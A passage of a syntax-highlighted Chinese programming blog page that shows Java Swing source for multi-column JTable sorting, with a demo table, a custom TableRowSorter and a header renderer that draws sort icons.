class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test.sort;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.swing.table.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><span class="hljs-keyword">import</span> java.awt.event.MouseAdapter;<br><span class="hljs-keyword">import</span> java.awt.event.MouseEvent;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TableSortDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JPanel</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TableSortDemo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GridLayout</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>));<br><br>        <span class="hljs-type">JTable</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTable</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AbstractTableModel</span>() &#123;<br>            <span class="hljs-keyword">private</span> String[] columnNames = &#123;<span class="hljs-string">&quot;First Name&quot;</span>,<br>                    <span class="hljs-string">&quot;Last Name&quot;</span>,<br>                    <span class="hljs-string">&quot;Sport&quot;</span>,<br>                    <span class="hljs-string">&quot;# of Years&quot;</span>,<br>                    <span class="hljs-string">&quot;Vegetarian&quot;</span>&#125;;<br>            <span class="hljs-keyword">private</span> Object[][] data = &#123;<br>                    &#123;<span class="hljs-string">&quot;Kathy&quot;</span>, <span class="hljs-string">&quot;Smith&quot;</span>,<br>                            <span class="hljs-string">&quot;Snowboarding&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">10</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">false</span>)&#125;,<br>                    &#123;<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-string">&quot;Doe&quot;</span>,<br>                            <span class="hljs-string">&quot;Rowing&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">3</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">true</span>)&#125;,<br>                    &#123;<span class="hljs-string">&quot;Sue&quot;</span>, <span class="hljs-string">&quot;White&quot;</span>,<br>                            <span class="hljs-string">&quot;Knitting&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">2</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">false</span>)&#125;,<br>                    &#123;<span class="hljs-string">&quot;Kathy&quot;</span>, <span class="hljs-string">&quot;White&quot;</span>,<br>                            <span class="hljs-string">&quot;Speed reading&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">20</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">true</span>)&#125;,<br>                    &#123;<span class="hljs-string">&quot;Joe&quot;</span>, <span class="hljs-string">&quot;Brown&quot;</span>,<br>                            <span class="hljs-string">&quot;Pool&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">10</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(<span class="hljs-literal">true</span>)&#125;<br>            &#125;;<br><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getColumnCount</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> columnNames.length;<br>            &#125;<br><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getRowCount</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> data.length;<br>            &#125;<br><br>            <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getColumnName</span><span class="hljs-params">(<span class="hljs-type">int</span> col)</span> &#123;<br>                <span class="hljs-keyword">return</span> columnNames[col];<br>            &#125;<br><br>            <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValueAt</span><span class="hljs-params">(<span class="hljs-type">int</span> row, <span class="hljs-type">int</span> col)</span> &#123;<br>                <span class="hljs-keyword">return</span> data[row][col];<br>            &#125;<br><br>            <span class="hljs-keyword">public</span> Class <span class="hljs-title function_">getColumnClass</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span> &#123;<br>                <span class="hljs-keyword">return</span> getValueAt(<span class="hljs-number">0</span>, c).getClass();<br>            &#125;<br>        &#125;);<br>        table.setPreferredScrollableViewportSize(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dimension</span>(<span class="hljs-number">500</span>, <span class="hljs-number">70</span>));<br>        table.setFillsViewportHeight(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// 设置自己的Sorter</span><br>        MultiColumnTableRowSorter&lt;TableModel&gt; tableRowSorter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MultiColumnTableRowSorter</span>&lt;&gt;(table.getModel());<br>        table.setRowSorter(tableRowSorter);<br><br>        <span class="hljs-comment">// 设置自己的表头Render</span><br>        table.getTableHeader().setDefaultRenderer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MutilColumnTableCellHeaderRenderer</span>());<br><br>        <span class="hljs-comment">// 设置监听，输出排序列调试信息</span><br>        table.getTableHeader().addMouseListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MouseAdapter</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">mouseClicked</span><span class="hljs-params">(MouseEvent e)</span> &#123;<br>                <span class="hljs-keyword">if</span> (e.getClickCount() % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> &amp;&amp; SwingUtilities.isLeftMouseButton(e)) &#123;<br>                    <span class="hljs-type">JTableHeader</span> <span class="hljs-variable">header</span> <span class="hljs-operator">=</span> table.getTableHeader();<br>                    RowSorter sorter;<br>                    <span class="hljs-keyword">if</span> ((sorter = table.getRowSorter()) != <span class="hljs-literal">null</span>) &#123;<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">columnIndex</span> <span class="hljs-operator">=</span> header.columnAtPoint(e.getPoint());<br>                        <span class="hljs-keyword">if</span> (columnIndex != -<span class="hljs-number">1</span>) &#123;<br>                            <span class="hljs-keyword">for</span> (Object key: sorter.getSortKeys()) &#123;<br>                                RowSorter.<span class="hljs-type">SortKey</span> <span class="hljs-variable">sortKey</span> <span class="hljs-operator">=</span> (RowSorter.SortKey)key;<br>                                System.out.print(sortKey.getColumn() + <span class="hljs-string">&quot;:&quot;</span> + sortKey.getSortOrder().name() + <span class="hljs-string">&quot;  |  &quot;</span>);<br>                            &#125;<br>                            System.out.println(<span class="hljs-string">&quot;\n--------------&quot;</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-type">JScrollPane</span> <span class="hljs-variable">scrollPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JScrollPane</span>(table);<br>        add(scrollPane);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createAndShowGUI</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;TableSortDemo&quot;</span>);<br>        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br><br>        <span class="hljs-type">TableSortDemo</span> <span class="hljs-variable">newContentPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TableSortDemo</span>();<br>        newContentPane.setOpaque(<span class="hljs-literal">true</span>); <span class="hljs-comment">//content panes must be opaque</span><br>        frame.setContentPane(newContentPane);<br><br>        frame.pack();<br>        frame.setVisible(<span class="hljs-literal">true</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        javax.swing.SwingUtilities.invokeLater(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                createAndShowGUI();<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>MultiColumnTableRowSorter.java</code>：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test.sort;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.swing.table.TableModel;<br><span class="hljs-keyword">import</span> javax.swing.table.TableRowSorter;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiColumnTableRowSorter</span>&lt;M <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TableModel</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TableRowSorter</span>&lt;M&gt; &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MultiColumnTableRowSorter</span><span class="hljs-params">(M model)</span> &#123;<br>        <span class="hljs-built_in">super</span>(model);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">toggleSortOrder</span><span class="hljs-params">(<span class="hljs-type">int</span> column)</span> &#123;<br>        checkColumn(column);<br>        <span class="hljs-keyword">if</span> (isSortable(column)) &#123;<br>            List&lt;SortKey&gt; keys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;SortKey&gt;(getSortKeys());<br>            SortKey sortKey;<br>            <span class="hljs-type">int</span> sortIndex;<br>            <span class="hljs-keyword">for</span> (sortIndex = keys.size() - <span class="hljs-number">1</span>; sortIndex &gt;= <span class="hljs-number">0</span>; sortIndex--) &#123;<br>                <span class="hljs-keyword">if</span> (keys.get(sortIndex).getColumn() == column) &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (sortIndex == -<span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-comment">// Key doesn&#x27;t exist</span><br>                sortKey = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SortKey</span>(column, SortOrder.ASCENDING);<br>                keys.add(sortKey);<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">SortKey</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> keys.get(sortIndex);<br>                <span class="hljs-keyword">if</span>(key.getSortOrder() == SortOrder.ASCENDING)&#123;<br>                    key = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SortKey</span>(key.getColumn(), SortOrder.DESCENDING);<br>                    keys.set(sortIndex, key);<br>                &#125;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(key.getSortOrder() == SortOrder.DESCENDING)&#123;<br>                    keys.remove(sortIndex);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (keys.size() &gt; getMaxSortKeys()) &#123;<br>                keys = keys.subList(getMaxSortKeys(), keys.size());<br>            &#125;<br>            setSortKeys(keys);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkColumn</span><span class="hljs-params">(<span class="hljs-type">int</span> column)</span> &#123;<br>        <span class="hljs-keyword">if</span> (column &lt; <span class="hljs-number">0</span> || column &gt;= getModelWrapper().getColumnCount()) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IndexOutOfBoundsException</span>(<br>                    <span class="hljs-string">&quot;column beyond range of TableModel&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>MutilColumnTableCellHeaderRenderer.java</code>（因为<code>sun.swing.table.DefaultTableCellRenderer</code>的<code>getColumnSortOrder</code>方法是静态方法不能被覆盖，所以直接复制<code>DefaultTableCellRenderer</code>类的代码修改<code>getColumnSortOrder</code>方法）:</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test.sort;<br><br><span class="hljs-keyword">import</span> sun.swing.DefaultLookup;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.swing.border.Border;<br><span class="hljs-keyword">import</span> javax.swing.plaf.UIResource;<br><span class="hljs-keyword">import</span> javax.swing.table.DefaultTableCellRenderer;<br><span class="hljs-keyword">import</span> javax.swing.table.JTableHeader;<br><span class="hljs-keyword">import</span> java.awt.*;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MutilColumnTableCellHeaderRenderer</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DefaultTableCellRenderer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UIResource</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> horizontalTextPositionSet;<br>    <span class="hljs-keyword">private</span> Icon sortArrow;<br>    <span class="hljs-keyword">private</span> MutilColumnTableCellHeaderRenderer.<span class="hljs-type">EmptyIcon</span> <span class="hljs-variable">emptyIcon</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MutilColumnTableCellHeaderRenderer</span>.EmptyIcon();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MutilColumnTableCellHeaderRenderer</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">this</span>.setHorizontalAlignment(<span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHorizontalTextPosition</span><span class="hljs-params">(<span class="hljs-type">int</span> textPosition)</span> &#123;<br>        <span class="hljs-built_in">this</span>.horizontalTextPositionSet = <span class="hljs-literal">true</span>;<br>        <span class="hljs-built_in">super</span>.setHorizontalTextPosition(textPosition);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Component <span class="hljs-title function_">getTableCellRendererComponent</span><span class="hljs-params">(JTable table, Object value, <span class="hljs-type">boolean</span> isSelected, <span class="hljs-type">boolean</span> hasFocus, <span class="hljs-type">int</span> row, <span class="hljs-type">int</span> column)</span> &#123;<br>        <span class="hljs-type">Icon</span> <span class="hljs-variable">icon</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">if</span> (table != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">JTableHeader</span> <span class="hljs-variable">header</span> <span class="hljs-operator">=</span> table.getTableHeader();<br>            <span class="hljs-keyword">if</span> (header != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">Color</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-type">Color</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>                <span class="hljs-keyword">if</span> (hasFocus) &#123;<br>                    var10 = DefaultLookup.getColor(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.ui, <span class="hljs-string">&quot;TableHeader.focusCellForeground&quot;</span>);<br>                    var11 = DefaultLookup.getColor(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.ui, <span class="hljs-string">&quot;TableHeader.focusCellBackground&quot;</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (var10 == <span class="hljs-literal">null</span>) &#123;<br>                    var10 = header.getForeground();<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (var11 == <span class="hljs-literal">null</span>) &#123;<br>                    var11 = header.getBackground();<br>                &#125;<br><br>                <span class="hljs-built_in">this</span>.setForeground(var10);<br>                <span class="hljs-built_in">this</span>.setBackground(var11);<br>                <span class="hljs-built_in">this</span>.setFont(header.getFont());<br>                var8 = header.isPaintingForPrint();<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (!var8 &amp;&amp; table.getRowSorter() != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.horizontalTextPositionSet) &#123;<br>                    <span class="hljs-built_in">this</span>.setHorizontalTextPosition(<span class="hljs-number">10</span>);<br>                &#125;<br><br>                <span class="hljs-type">SortOrder</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> getColumnSortOrder(table, column);<br>                <span class="hljs-keyword">if</span> (var12 != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">switch</span>(var12) &#123;<br>                        <span class="hljs-keyword">case</span> ASCENDING:<br>                            icon = DefaultLookup.getIcon(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.ui, <span class="hljs-string">&quot;Table.ascendingSortIcon&quot;</span>);<br>                            <span class="hljs-keyword">break</span>;<br>                        <span class="hljs-keyword">case</span> DESCENDING:<br>                            icon = DefaultLookup.getIcon(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.ui, <span class="hljs-string">&quot;Table.descendingSortIcon&quot;</span>);<br>                            <span class="hljs-keyword">break</span>;<br>                        <span class="hljs-keyword">case</span> UNSORTED:<br>                            icon = DefaultLookup.getIcon(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.ui, <span class="hljs-string">&quot;Table.naturalSortIcon&quot;</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.setText(value == <span class="hljs-literal">null</span> ? <span class="hljs-string">&quot;&quot;</span> : value.toString());<br>        <span class="hljs-built_in">this</span>.setIcon(icon);<br>        <span class="hljs-built_in">this</span>.sortArrow = icon;<br>        <span class="hljs-type">Border</span> <span class="hljs-variable">var13</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (hasFocus) &#123;<br>            var13 = DefaultLookup.getBorder(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.ui, <span class="hljs-string">&quot;TableHeader.focusCellBorder&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (var13 == <span class="hljs-literal">null</span>) &#123;<br>            var13 = DefaultLookup.getBorder(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.ui, <span class="hljs-string">&quot;TableHeader.cellBorder&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.setBorder(var13);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SortOrder <span class="hljs-title function_">getColumnSortOrder</span><span class="hljs-params">(JTable table, <span class="hljs-type">int</span> columnIndex)</span> &#123;<br>        <span class="hljs-type">SortOrder</span> <span class="hljs-variable">sortOrder</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (table != <span class="hljs-literal">null</span> &amp;&amp; table.getRowSorter() != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">List</span> <span class="hljs-variable">sortKeys</span> <span class="hljs-operator">=</span> table.getRowSorter().getSortKeys();<br>            columnIndex = table.convertColumnIndexToModel(columnIndex);<br>            <span class="hljs-keyword">if</span> (sortKeys.size() &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">for</span>(Object sortKey:sortKeys)&#123;<br>                    <span class="hljs-keyword">if</span>(columnIndex == ((RowSorter.SortKey)sortKey).getColumn())&#123;<br>                        sortOrder = ((RowSorter.SortKey)sortKey).getSortOrder();<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> sortOrder;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> sortOrder;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">paintComponent</span><span class="hljs-params">(Graphics var1)</span> &#123;<br>        <span class="hljs-comment">// 若配置TableHeader.rightAlignSortArrow为true，表头单元格里的箭头将居右显示</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> DefaultLookup.getBoolean(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">this</span>.ui, <span class="hljs-string">&quot;TableHeader.rightAlignSortArrow&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-keyword">if</span> (var2 &amp;&amp; <span class="hljs-built_in">this</span>.sortArrow != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.emptyIcon.width = <span class="hljs-built_in">this</span>.sortArrow.getIconWidth();<br>            <span class="hljs-built_in">this</span>.emptyIcon.height = <span class="hljs-built_in">this</span>.sortArrow.getIconHeight();<br>            <span class="hljs-built_in">this</span>.setIcon(<span class="hljs-built_in">this</span>.emptyIcon);<br>            <span class="hljs-built_in">super</span>.paintComponent(var1);<br>            <span class="hljs-type">Point</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.computeIconPosition(var1);<br>            <span class="hljs-built_in">this</span>.sortArrow.paintIcon(<span class="hljs-built_in">this</span>, var1, var3.x, var3.y);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">super</span>.paintComponent(var1);<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-keyword">private</span> Point <span class="hljs-title function_">computeIconPosition</span><span class="hljs-params">(Graphics var1)</span> &#123;<br>        <span class="hljs-type">FontMetrics</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> var1.getFontMetrics();<br>        <span class="hljs-type">Rectangle</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>();<br>        <span class="hljs-type">Rectangle</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>();<br>        <span class="hljs-type">Rectangle</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>();<br>        <span class="hljs-type">Insets</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getInsets();<br>        var3.x = var6.left;<br>        var3.y = var6.top;<br>        var3.width = <span class="hljs-built_in">this</span>.getWidth() - (var6.left + var6.right);<br>        var3.height = <span class="hljs-built_in">this</span>.getHeight() - (var6.top + var6.bottom);<br>        SwingUtilities.layoutCompoundLabel(<span class="hljs-built_in">this</span>, var2, <span class="hljs-built_in">this</span>.getText(), <span class="hljs-built_in">this</span>.sortArrow, <span class="hljs-built_in">this</span>.getVerticalAlignment(), <span class="hljs-built_in">this</span>.getHorizontalAlignment(), <span class="hljs-built_in">this</span>.getVerticalTextPosition(), <span class="hljs-built_in">this</span>.getHorizontalTextPosition(), var3, var5, var4, <span class="hljs-built_in">this</span>.getIconTextGap());<br>        <span class="hljs-type">int</span> <span 